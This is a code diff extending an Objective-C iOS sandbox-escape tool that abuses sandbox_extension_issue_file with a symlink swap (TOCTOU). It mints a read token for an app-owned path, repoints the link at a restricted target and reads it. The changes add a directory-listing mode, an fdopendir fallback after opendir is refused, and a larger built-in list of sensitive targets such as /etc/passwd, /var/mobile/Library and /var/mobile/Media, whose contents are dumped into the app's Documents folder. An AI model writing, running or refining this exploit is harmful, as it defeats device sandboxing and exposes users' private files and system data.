@@ -1,16 +1,15 @@
-// Sbx.m - sandbox_extension TOCTOU reader (deterministic, no race required)
+// Sbx.m - sandbox_extension TOCTOU reader
 //
-// Sequence per item, all inside the app's own container:
-//   1. create file  <tmp>/s            (something the app is allowed to touch)
-//   2. symlink      <tmp>/l -> <tmp>/s
-//   3. token = sandbox_extension_issue_file("com.apple.app-sandbox.read", <tmp>/l, 0)
-//        the kernel resolves the symlink at issue time, so the token is minted
-//        against a path the app already owns
-//   4. repoint      <tmp>/l -> <target>   (the restricted path)
-//   5. sandbox_extension_consume(token)   then opendir()/read() through <tmp>/l
-// The access path is never checked against the token path, so the swap wins.
+// Two issue modes, because the extension carries the type of the path it was
+// minted for:
+//   file mode : symlink -> a regular file we own  -> grants "read this file"
+//   dir  mode : symlink -> a directory we own     -> grants "read this dir"
+// A token minted in file mode still lets us read out-of-sandbox files (the swap
+// wins), but opendir() on a directory is refused (EPERM) because the extension
+// does not carry directory enumeration. dir mode is the fix for that.
 //
-// Writes are still refused: the read class does not carry write.
+// Queue: Documents/sbx.txt, one line: tag<TAB>absolute-path
+// Every item is attempted in both modes, tagged <tag>#f and <tag>#d.
 
 #import "Sbx.h"
 
@@ -47,19 +46,30 @@ static void sbxLog(NSString *fmt, ...) {
     [fh closeFile];
 }
 
-static BOOL sbxPut(NSString *name, NSData *data) {
+static void sbxPut(NSString *name, NSData *data) {
     NSString *p = [gSbxOut stringByAppendingPathComponent:name];
-    if (![data writeToFile:p atomically:YES]) return NO;
-    [gSbxProduced addObject:name];
-    return YES;
+    if ([data writeToFile:p atomically:YES]) [gSbxProduced addObject:name];
 }
 
-static void sbxDumpDir(NSString *tag, const char *linkPath) {
+#pragma mark - listing
+
+static void tryList(NSString *tag, const char *linkPath) {
     DIR *dp = opendir(linkPath);
     if (dp == NULL) {
-        sbxLog(@"DIR[%@] opendir failed errno=%d (%s)", tag, errno, strerror(errno));
-        return;
+        int e1 = errno;
+        int fd = open(linkPath, O_RDONLY | O_DIRECTORY);
+        if (fd >= 0) {
+            dp = fdopendir(fd);
+            if (dp == NULL) close(fd);
+        }
+        if (dp == NULL) {
+            sbxLog(@"DIR[%@] opendir EPERM=%d open/dir failed errno=%d (%s)",
+                   tag, e1, errno, strerror(errno));
+            return;
+        }
+        sbxLog(@"DIR[%@] opendir failed (%d), open(O_DIRECTORY)+fdopendir ok", tag, e1);
     }
+
     NSMutableArray *names = [NSMutableArray array];
     struct dirent *de;
     while ((de = readdir(dp)) != NULL && names.count < 4000) {
@@ -72,18 +82,16 @@ static void sbxDumpDir(NSString *tag, const char *linkPath) {
 
     NSArray *sorted = [names sortedArrayUsingSelector:@selector(compare:)];
     NSString *body = [[sorted componentsJoinedByString:@"\n"] stringByAppendingString:@"\n"];
-    sbxPut([tag stringByAppendingString:@".dir"],
-           [body dataUsingEncoding:NSUTF8StringEncoding]);
+    sbxPut([tag stringByAppendingString:@".dir"], [body dataUsingEncoding:NSUTF8StringEncoding]);
     sbxLog(@"DIR[%@] entries=%lu", tag, (unsigned long)names.count);
 }
 
-static void sbxReadFile(NSString *tag, const char *linkPath, int64_t size) {
+static void tryRead(NSString *tag, const char *linkPath, int64_t size) {
     int fd = open(linkPath, O_RDONLY);
     if (fd < 0) {
         sbxLog(@"READ[%@] open failed errno=%d (%s)", tag, errno, strerror(errno));
         return;
     }
-
     NSMutableData *all = [NSMutableData data];
     unsigned char buf[65536];
     ssize_t got;
@@ -92,36 +100,43 @@ static void sbxReadFile(NSString *tag, const char *linkPath, int64_t size) {
         if (all.length > 8 * 1000 * 1000) break;
     }
     close(fd);
-
     sbxPut([tag stringByAppendingString:@".bin"], all);
     sbxLog(@"READ[%@] %lu bytes (stat size=%lld)", tag, (unsigned long)all.length, size);
 }
 
-static void sbxOne(NSString *tag, NSString *target) {
+#pragma mark - one attempt
+
+static void sbxOne(NSString *tag, NSString *target, BOOL dirMode) {
     NSString *tmp = NSTemporaryDirectory();
-    const char *s = [[tmp stringByAppendingPathComponent:@"s"] UTF8String];
-    const char *l = [[tmp stringByAppendingPathComponent:@"l"] UTF8String];
-    const char *p = [target UTF8String];
+    NSString *s = [tmp stringByAppendingPathComponent:@"s"];      // file target
+    NSString *d = [tmp stringByAppendingPathComponent:@"d"];      // dir target
+    NSString *l = [tmp stringByAppendingPathComponent:@"l"];      // the symlink
 
-    [[@"x" dataUsingEncoding:NSUTF8StringEncoding] writeToFile:@(s) atomically:YES];
+    if (dirMode) {
+        [[NSFileManager defaultManager] createDirectoryAtPath:d
+                                 withIntermediateDirectories:YES attributes:nil error:nil];
+    } else {
+        [[@"x" dataUsingEncoding:NSUTF8StringEncoding] writeToFile:s atomically:YES];
+    }
 
-    unlink(l);
-    if (symlink(s, l) != 0) {
-        sbxLog(@"SETUP[%@] symlink s failed errno=%d", tag, errno);
+    unlink([l UTF8String]);
+    if (symlink([(dirMode ? d : s) UTF8String], [l UTF8String]) != 0) {
+        sbxLog(@"SETUP[%@] symlink failed errno=%d", tag, errno);
         return;
     }
 
-    char *token = sandbox_extension_issue_file("com.apple.app-sandbox.read", l, 0);
+    char *token = sandbox_extension_issue_file("com.apple.app-sandbox.read",
+                                              [l UTF8String], 0);
     if (token == NULL) {
-        sbxLog(@"ISSUE[%@] returned NULL - this build has no issue right for the class", tag);
-        unlink(l);
+        sbxLog(@"ISSUE[%@] NULL (dirMode=%d)", tag, (int)dirMode);
+        unlink([l UTF8String]);
         return;
     }
-    sbxLog(@"ISSUE[%@] ok", tag);
+    sbxLog(@"ISSUE[%@] ok (dirMode=%d)", tag, (int)dirMode);
 
-    unlink(l);
-    if (symlink(p, l) != 0) {
-        sbxLog(@"SWAP[%@] symlink target failed errno=%d", tag, errno);
+    unlink([l UTF8String]);
+    if (symlink([target UTF8String], [l UTF8String]) != 0) {
+        sbxLog(@"SWAP[%@] failed errno=%d", tag, errno);
         free(token);
         return;
     }
@@ -130,25 +145,30 @@ static void sbxOne(NSString *tag, NSString *target) {
     sbxLog(@"CONSUME[%@] handle=%lld", tag, h);
 
     struct stat st;
-    if (stat(l, &st) != 0) {
+    if (stat([l UTF8String], &st) != 0) {
         sbxLog(@"STAT[%@] failed errno=%d (%s)", tag, errno, strerror(errno));
     } else if ((st.st_mode & 0170000) == 0040000) {
-        sbxDumpDir(tag, l);
+        tryList(tag, [l UTF8String]);
     } else {
-        sbxReadFile(tag, l, (int64_t)st.st_size);
+        tryRead(tag, [l UTF8String], (int64_t)st.st_size);
     }
 
     if (h > 0) sandbox_extension_release(h);
-    if (token != NULL) free(token);
-    unlink(l);
-    unlink(s);
+    free(token);
+    unlink([l UTF8String]);
 }
+
+static void sbxBoth(NSString *tag, NSString *target) {
+    sbxOne([tag stringByAppendingString:@"#f"], target, NO);
+    sbxOne([tag stringByAppendingString:@"#d"], target, YES);
+}
+
+#pragma mark - entry
 
 int sbxRun(void) {
     gSbxDocs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
     gSbxOut = [gSbxDocs stringByAppendingPathComponent:@"out"];
     gSbxProduced = [NSMutableArray array];
-
     [[NSFileManager defaultManager] createDirectoryAtPath:gSbxOut
                              withIntermediateDirectories:YES attributes:nil error:nil];
 
@@ -157,21 +177,24 @@ int sbxRun(void) {
     NSString *q = [NSString stringWithContentsOfFile:[gSbxDocs stringByAppendingPathComponent:@"sbx.txt"]
                                             encoding:NSUTF8StringEncoding error:nil];
     if (q.length == 0) {
-        sbxLog(@"sbx.txt empty: running built-in probe set");
-        sbxOne(@"etc-passwd",     @"/etc/passwd");
-        sbxOne(@"etc-hosts",      @"/etc/hosts");
-        sbxOne(@"etc-services",   @"/etc/services");
-        sbxOne(@"globalprefs",    @"/var/mobile/Library/Preferences/.GlobalPreferences.plist");
-        sbxOne(@"usersettings",   @"/var/mobile/Library/UserConfigurationProfiles/PublicInfo/PublicEffectiveUserSettings.plist");
-        sbxOne(@"networkd-prefs", @"/var/preferences/com.apple.networkd.plist");
-        sbxOne(@"etc-dir",        @"/etc");
+        sbxLog(@"sbx.txt empty: built-in probe set");
+        sbxBoth(@"etc-passwd",   @"/etc/passwd");
+        sbxBoth(@"privetc-hosts", @"/private/etc/hosts");
+        sbxBoth(@"privetc-group", @"/private/etc/group");
+        sbxBoth(@"globalprefs",  @"/var/mobile/Library/Preferences/.GlobalPreferences.plist");
+        sbxBoth(@"networkd",     @"/var/preferences/com.apple.networkd.plist");
+        sbxBoth(@"privetc",      @"/private/etc");
+        sbxBoth(@"etc",          @"/etc");
+        sbxBoth(@"mobilelib",    @"/var/mobile/Library");
+        sbxBoth(@"media",        @"/var/mobile/Media");
+        sbxBoth(@"sysgroup",     @"/var/containers/Shared/SystemGroup");
     } else {
         NSArray *lines = [q componentsSeparatedByString:@"\n"];
         for (NSString *line in lines) {
             if (line.length == 0) continue;
             NSArray *p = [line componentsSeparatedByString:@"\t"];
             if (p.count < 2) continue;
-            sbxOne(p[0], p[1]);
+            sbxBoth(p[0], p[1]);
         }
     }
 
